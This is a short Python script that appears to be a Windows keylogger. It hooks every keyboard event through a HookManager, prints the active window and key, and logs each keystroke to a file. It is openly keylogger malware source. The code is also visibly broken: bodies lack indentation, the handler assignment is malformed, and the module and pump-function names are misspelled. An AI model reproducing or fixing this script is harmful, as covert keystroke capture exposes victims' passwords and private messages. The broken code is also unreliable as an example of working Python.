import pyHOOK, pythoncom, sys, logging, time, datetime

carpeta_destino= ''

def OnkeyboardEvent(event):
logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
print('WindowName:', event.WindowName)
print('Window:', event.Window)
print('Key:', event.Key)
logging.log(10, event.Key)
return True

hooks_manager = pyHOOK.HookManager()
hooks_manager = KEY_DOWN= OnkeyboardEvent
hooks_manager.HookKeyboard()

while True:
    pythoncom.pumpWaittingMessages()